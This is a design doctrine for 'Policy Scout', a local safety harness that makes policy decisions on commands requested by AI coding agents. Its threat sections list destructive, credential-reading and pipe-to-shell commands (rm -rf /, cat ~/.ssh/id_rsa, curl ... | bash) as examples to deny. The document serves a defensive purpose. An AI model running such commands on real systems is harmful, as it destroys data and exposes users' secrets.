# Policy Scout — Core Doctrine and Boundaries

## 1. Purpose

Policy Scout is a local-first safety harness for agent commands, package installs, and suspicious project activity.

Short tagline:

```text
Policy Scout: light armor for fast agents.
```

Policy Scout protects local development workflows by placing a policy-centered decision boundary between actors and execution.

It is designed for AI-assisted development where commands may be suggested or requested by:

* AI coding agents
* IDE assistants
* local automation tools
* CLI wrappers
* CI jobs
* future MCP-style tool callers
* human developers copy/pasting commands

The goal is not to slow agents down with heavy armor.

The goal is lightweight, durable protection:

* fast enough to preserve useful automation
* strict enough to stop dangerous actions
* transparent enough that users understand what happened
* auditable enough that important decisions can be reviewed later

---

## 2. Core Doctrine

Policy Scout is policy-centered, not agent-centered.

Use this doctrine consistently:

```text
Actors request.
Policy Scout decides.
Executors obey.
Audit records everything.
```

Expanded form:

```text
An actor may request an action.
The request normalizer structures it.
The parser and classifier interpret it.
The policy engine decides what is allowed.
The executor obeys the decision.
The audit layer records the event.
The report layer explains what happened.
```

Agents may request actions, but agents do not govern.

LLMs may explain decisions, summarize reports, and suggest safer alternatives, but LLMs do not decide whether commands run.

The deterministic policy engine owns the final decision.

---

## 3. Primary Safety Boundary

Policy Scout sits between risky developer actions and the user's machine.

Primary flow:

```text
Actor
  -> Command / Tool Request
  -> Request Normalizer
  -> Command Parser
  -> Command Classifier
  -> Capability Detector
  -> Context Inspector
  -> Registry Matcher
  -> Risk Scorer
  -> Policy Engine
  -> Decision
  -> Approval / Sandbox / Direct Executor / Denial
  -> Audit Event
  -> Scout Report when needed
```

Short flow:

```text
request -> classify -> policy -> decision -> approval/sandbox/deny -> audit/report
```

The boundary must remain clear:

* actors do not execute directly through Policy Scout
* executors do not make policy decisions
* reports do not override policy decisions
* LLMs do not override policy decisions
* integrations do not bypass policy decisions
* approvals are explicit, narrow, and auditable

---

## 4. Product Pillars

### 4.1 Permission Firewall

Policy Scout evaluates commands before they execute.

Supported decisions:

```text
ALLOW
ALLOW_LOGGED
REQUIRE_APPROVAL
SANDBOX_FIRST
DENY
DENY_AND_ALERT
```

Every decision should include reasons.

Every risky decision should be auditable.

### 4.2 Registry-First Command Knowledge

Command and policy knowledge should live in registries where practical.

Registries may define:

* command families
* package-manager behavior
* risk categories
* known dangerous shell patterns
* suspicious indicators
* policy defaults
* recommended controls

Registries are policy data, not hidden code.

### 4.3 Package Install Sandbox

Risky dependency installs should be tested away from the real project before host mutation.

Initial sandbox flow:

```text
create temporary workspace
copy manifest and lockfiles
run package install in sandbox
inspect lifecycle scripts
capture manifest and lockfile diffs
scan sandbox artifacts
produce Scout Report
ask before migration
```

The sandbox is a review workspace, not a perfect malware containment system.

### 4.4 Sweep Engine

Policy Scout can inspect projects and local development environments for suspicious traces.

Initial project checks include:

* package lifecycle scripts
* suspicious package manifests
* lockfile changes
* GitHub Actions workflow changes
* executable files
* suspicious JavaScript patterns
* credential-adjacent references
* unexpected project mutations

Initial quick system checks include:

* listening ports
* suspicious local development processes
* unexpected Node/Bun/Python processes
* recent shell profile changes
* package manager config changes
* suspicious temp files
* sensitive environment variable names

Sweep findings are evidence, not proof of compromise.

Use cautious language:

```text
suspicious finding
possible exposure
review recommended
could not verify
```

Avoid unsupported claims like:

```text
malware confirmed
you are infected
credentials definitely stolen
```

unless evidence is confirmed.

### 4.5 Scout Reports

Scout Reports explain important decisions, sandbox results, sweep findings, blocked commands, and possible incidents.

Reports should include:

* summary
* risk or finding level
* triggering command or sweep
* timeline where useful
* findings
* evidence locations
* possible credential exposure
* recommended response
* what Policy Scout could not verify
* audit event IDs

Reports should be clear enough for beginners and precise enough for advanced developers.

---

## 5. Actors

An actor is anything requesting an action.

Allowed actor types:

```text
human
agent
ide
cli
ci
unknown
```

### 5.1 Human

A local human user directly requested the command.

Humans can approve allowed override paths, but approval must be explicit and logged.

### 5.2 Agent

An AI agent requested a command or tool call.

Agents should be treated as useful but not trusted with unrestricted execution.

Agents cannot approve their own risky requests.

### 5.3 IDE

An editor, IDE plugin, or assistant integration requested the action.

IDE integrations preserve actor/source metadata and must not bypass policy.

### 5.4 CLI

A CLI wrapper or script requested the action.

CLI wrappers still submit requests; they do not become the policy authority.

### 5.5 CI

A CI system requested the action.

CI mode should be non-interactive and fail closed for risky actions.

### 5.6 Unknown

The actor could not be confidently identified.

Unknown actors should be treated conservatively.

---

## 6. Trust Levels

Initial trust levels:

```text
trusted_local
known_tool
untrusted_agent
unknown_actor
ci_actor
```

Trust affects friction, not hard safety rules.

Examples:

* a trusted local human may approve a project-local destructive command
* an untrusted agent should face more friction for risky actions
* credential-adjacent access remains dangerous regardless of actor
* network-fetched shell execution remains denied by default
* repeated requests do not prove safety

---

## 7. Protected Assets

Policy Scout helps protect:

### 7.1 Credentials and Secrets

Examples:

* `.env`
* `.npmrc`
* SSH keys
* API keys
* GitHub tokens
* cloud provider credentials
* package registry tokens
* local config files containing secrets

### 7.2 Project Integrity

Examples:

* source code
* package manifests
* lockfiles
* build scripts
* test scripts
* CI workflows
* generated files
* project configuration

### 7.3 Developer Environment Integrity

Examples:

* shell profiles
* user-level package manager config
* installed global tools
* local services
* startup tasks
* user crontab
* systemd user services

### 7.4 User Trust and Attention

Policy Scout should avoid panic, false certainty, noisy prompts, and vague warnings.

Users should understand:

* what was requested
* why it mattered
* what was allowed or blocked
* what was not verified
* what they should do next

### 7.5 Auditability

Policy Scout should preserve durable evidence of important decisions.

Audit records help users understand:

* what was requested
* who requested it
* what Policy Scout decided
* why the decision was made
* what executed
* what findings were produced
* what reports were generated

---

## 8. In-Scope Threats

Policy Scout v0.1 focuses on practical AI-assisted development risks.

### 8.1 Unsafe Agent Commands

Examples:

```bash
rm -rf /
rm -rf ~/.config
chmod -R 777 .
cat ~/.ssh/id_rsa
```

Policy Scout should classify, deny, require approval, or alert based on risk.

### 8.2 Risky Package Installs

Examples:

```bash
npm install unknown-package
pnpm add suspicious-lib
yarn add package
bun add package
```

Risks include:

* lifecycle scripts
* dependency confusion
* typosquatting
* malicious transitive dependencies
* lockfile mutation
* credential exposure during install
* native build steps

Package installs should route to sandbox-first behavior where possible.

### 8.3 Package Execution

Examples:

```bash
npx unknown-tool
pnpm dlx random-cli
bunx tool
```

Package execution may download and run code directly.

Treat unknown package execution as high-risk.

### 8.4 Network-Fetched Shell Execution

Examples:

```bash
curl https://example.com/install.sh | bash
wget -O- https://example.com/script.sh | sh
```

These should be denied by default.

### 8.5 Suspicious Lifecycle Scripts

Suspicious lifecycle behavior may include:

* child process execution
* shell execution
* network fetch
* obfuscated JavaScript
* credential file access
* environment variable harvesting
* persistence attempts

### 8.6 Workflow Injection

CI workflow changes can expose secrets or alter release behavior.

Policy Scout should flag suspicious workflow changes during sweeps.

### 8.7 Credential-Adjacent Access

Examples:

```bash
cat .env
cat ~/.npmrc
cat ~/.ssh/id_rsa
grep -r "TOKEN" .
```

Credential-adjacent behavior should be treated as high risk.

### 8.8 Persistence Mechanisms

Examples:

* shell profile modification
* crontab modification
* systemd user service creation
* startup script creation
* package manager config modification

Policy Scout v0.1 should detect obvious user-level and project-level persistence indicators where feasible.

### 8.9 Suspicious Processes and Open Ports

Quick system sweep may inspect:

* unexpected Node/Bun/Python processes
* listening ports
* suspicious process command lines
* recently executable temp files

Findings should be cautious and evidence-based.

### 8.10 Audit Gaps

Policy Scout should log important requests, decisions, approvals, executions, sandbox results, findings, and reports.

A dangerous workflow should not disappear into terminal scrollback.

---

## 9. Out-of-Scope for v0.1

Policy Scout v0.1 does not attempt to be:

* a full antivirus engine
* a complete endpoint detection platform
* a kernel-level sandbox
* a rootkit detector
* a memory forensics tool
* a packet inspection system
* a browser exploit detector
* a cloud account compromise detector
* an automatic credential rotation tool
* an automatic incident remediation system
* an enterprise multi-user policy server
* a cloud dashboard
* an editor extension
* a default Docker sandbox system
* a full MCP server
* a community rule marketplace

Policy Scout should not automatically:

* delete suspicious files
* quarantine files
* kill processes
* close ports
* rotate credentials
* modify system files
* silently create permanent allow rules
* upload reports or audit logs

Policy Scout may recommend manual follow-up, but it must not claim responsibilities it does not fulfill.

---

## 10. Local-First Posture

Policy Scout is local-first by default.

Durable state should stay on the user's machine unless the user explicitly chooses otherwise.

Local durable state includes:

* policies
* registries
* audit logs
* approval history
* sandbox results
* Scout Reports
* sweep findings
* configuration

No automatic remote upload in v0.1.

Network-backed features may exist later as optional adapters, but core operation should not require:

* cloud services
* remote dashboards
* hosted policy engines
* hosted approval systems
* silent telemetry

Policy Scout should distinguish between:

* network access performed by Policy Scout itself
* network access performed by the requested command

Package installation may require network access because package managers use remote registries.

Policy Scout should make that distinction clear.

---

## 11. Privacy Rules

Policy Scout may encounter sensitive data.

Examples:

* `.env`
* `.npmrc`
* SSH keys
* API keys
* package registry tokens
* cloud credentials
* shell history
* local file paths
* project names
* process command lines
* environment variables
* private package names

Policy Scout must avoid exposing this data unnecessarily.

### 11.1 Redaction

Redact secret values in:

* terminal output
* audit logs
* Scout Reports
* JSON exports
* error messages
* sandbox logs where feasible

Preferred placeholders:

```text
<redacted:possible_token>
<redacted:ssh_private_key>
<redacted:env_value>
```

Good:

```text
Credential-adjacent file referenced: .env
```

Bad:

```text
OPENAI_API_KEY=sk-actual-value
```

### 11.2 Environment Variables

Do not dump environment variables.

Sensitive variable names may be reported when useful, but values must not be printed.

Examples of sensitive names:

```text
TOKEN
API_KEY
SECRET
PASSWORD
NPM_TOKEN
GITHUB_TOKEN
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
OPENAI_API_KEY
ANTHROPIC_API_KEY
```

### 11.3 Local File Paths

Local paths can reveal private information.

Guidance:

* show project-relative paths where possible
* avoid exposing home directory unnecessarily
* normalize home paths to `~` where practical
* preserve enough evidence for local review

### 11.4 Process Information

Process command lines can contain secrets.

Guidance:

* avoid printing full command lines by default
* redact token-like substrings
* include PID/process name where useful
* only include command line summaries when redacted

---

## 12. Integration Boundaries

Integrations may submit requests.

Policy Scout still decides.

Integration tiers:

```text
Tier 1: CLI wrapper
Tier 2: shell shims
Tier 3: local HTTP API
Tier 4: MCP-style tool server
Tier 5: editor extensions
Tier 6: CI integration
```

Build in order.

Do not start with MCP or editor extensions.

### 12.1 CLI Wrapper

The CLI is the first and most important integration.

It proves the core boundary:

```bash
policy-scout check -- <command>
policy-scout run -- <command>
policy-scout sandbox -- <command>
policy-scout sweep project
policy-scout sweep quick
```

### 12.2 Shell Shims

Shell shims can route common commands through Policy Scout.

Examples:

```text
npm -> policy-scout run -- npm
pnpm -> policy-scout run -- pnpm
npx -> policy-scout run -- npx
```

Shell shims should be opt-in.

They are not v0.1 default behavior.

### 12.3 Local HTTP API

A local API may come later.

Requirements:

* bind to localhost only by default
* disabled unless explicitly enabled
* require local token or socket auth
* log actor/source
* do not expose raw shell execution without policy
* support JSON only

### 12.4 MCP-Style Tool Server

Policy Scout may eventually expose MCP-style tools.

Possible tools:

```text
policy_scout.check_command
policy_scout.run_command
policy_scout.sandbox_install
policy_scout.sweep_project
policy_scout.get_report
policy_scout.list_approvals
policy_scout.resolve_approval
```

Rules:

* agents cannot approve their own requests
* tool calls must include actor identity
* tool calls must produce audit events
* `run_command` must obey policy decisions
* denied commands must not execute
* risky commands must pause or sandbox
* MCP server should be disabled by default

MCP should come after the CLI and local API are stable.

### 12.5 Editor Extensions

Editor extensions are future work.

They must not create hidden execution pathways.

### 12.6 CI Integration

CI integration should be non-interactive.

Risky decisions should fail closed or produce machine-readable reports depending on configuration.

---

## 13. Cross-Project Boundaries

Policy Scout may eventually exchange structured data with related projects.

### 13.1 Cerebra Boundary

Cerebra may remember and reason over:

* Scout Reports
* audit summaries
* decision events
* incident summaries
* project risk history

Cerebra must not override Policy Scout policy decisions.

### 13.2 LumaWeave Boundary

LumaWeave may visualize:

* command request nodes
* decision nodes
* policy hit nodes
* finding nodes
* report nodes
* sandbox result nodes
* timeline edges

LumaWeave visualizes.

Policy Scout decides.

### 13.3 Bons.ai Boundary

Bons.ai is a reference lab for control patterns.

Useful ideas include:

* pure decision controllers
* granular scoring
* mode persistence
* event logging
* conservative adaptive behavior

Do not port Bons.ai's agent-centered loop into Policy Scout.

Policy Scout is not an idea-generation agent.

---

## 14. LLM Boundary

LLMs may assist with:

* explaining decisions
* summarizing reports
* generating safer alternative suggestions
* converting technical findings into beginner-friendly language
* drafting documentation
* reviewing code for consistency

LLMs must not:

* decide whether a command runs
* override policy
* approve actions
* execute commands directly
* receive raw secrets unnecessarily
* hide findings
* rewrite policy silently
* silently modify registries
* silently lower safety friction

LLM use should be optional.

The policy engine is the authority.

---

## 15. Failure Behavior

Policy Scout should fail safely.

Examples:

* parser uncertainty -> require approval or deny based on risk
* registry load failure -> deny risky commands
* policy engine failure -> deny execution
* audit store failure -> do not run risky commands
* sandbox failure -> do not migrate changes
* sweep error -> report incomplete verification
* unsupported platform checks -> record `could_not_verify`

Fail-safe does not always mean deny.

For high-risk or unknown execution, fail-safe should be conservative.

For sweeps, fail-safe should preserve uncertainty by reporting what could not be verified.

---

## 16. Naming Conventions

### 16.1 File Names

Use uppercase snake case for docs:

```text
PROJECT_SCOPE.md
POLICY_DESIGN.md
DATA_MODELS.md
```

Use lowercase snake case for Python files:

```text
command_classifier.py
risk_scorer.py
sqlite_store.py
```

### 16.2 ID Prefixes

Use canonical prefixes:

```text
req_      request
eval_     evaluation
dec_      decision
risk_     risk score
appr_     approval
exec_     execution
sbx_      sandbox
sweep_    sweep
find_     finding
evt_      audit event
report_   report
```

### 16.3 Registry IDs

Use lowercase dot notation:

```text
npm.install
package_installs_sandbox_first
network_execute_deny
credential_access_deny_and_alert
```

### 16.4 Categories

Use lowercase snake case:

```text
package_install
network_execute
credential_adjacent
```

### 16.5 Capabilities

Use dotted capability names:

```text
network.fetch
network.execute
filesystem.project_write
credential.access_possible
```

### 16.6 Decision Names

Use uppercase:

```text
ALLOW
ALLOW_LOGGED
REQUIRE_APPROVAL
SANDBOX_FIRST
DENY
DENY_AND_ALERT
```

### 16.7 Severity Names

Use lowercase:

```text
info
low
medium
high
critical
```

### 16.8 Confidence Names

Use lowercase:

```text
low
moderate
high
confirmed
```

---

## 17. Preferred Technical Language

Use:

```text
request
classification
capability
policy
decision
audit
finding
report
sandbox
approval
```

Avoid vague terms:

```text
magic
brain
smartness
AI decided
agent permission
probably safe
```

---

## 18. Report Tone

Use calm, precise language.

Prefer:

```text
Policy Scout found a suspicious lifecycle script.
Review is recommended before host installation.
Credential exposure is possible.
Policy Scout could not verify network behavior.
```

Avoid unsupported claims:

```text
Your machine is infected.
Malware confirmed.
Credentials definitely stolen.
```

unless evidence is confirmed.

---

## 19. Agent Conventions

Agents working on Policy Scout should:

* use exact taxonomy names
* avoid inventing new categories casually
* update docs when adding terms
* add tests for new terms
* preserve redaction
* preserve local-first behavior
* preserve auditability
* preserve the policy boundary
* avoid broad refactors during security-sensitive passes
* report deviations instead of silently rewriting doctrine to match code

Agents must not:

* approve their own risky actions
* weaken policy to make tests pass
* hide findings
* introduce remote services into core v0.1
* claim planned features are implemented without code and tests
* make LLM output the final authority for safety decisions

---

## 20. Core Doctrine Recap

Policy Scout exists because agentic development expands the execution surface.

The safest design is not to trust the agent less emotionally.

The safest design is to give every actor the same structured boundary:

```text
request -> classify -> score -> decide -> execute/sandbox/deny -> audit/report
```

Policy Scout should protect the developer without pretending to be a full security platform.

The harness is the product.

Integrations are adapters.

Adapters may change.

The policy boundary should not.
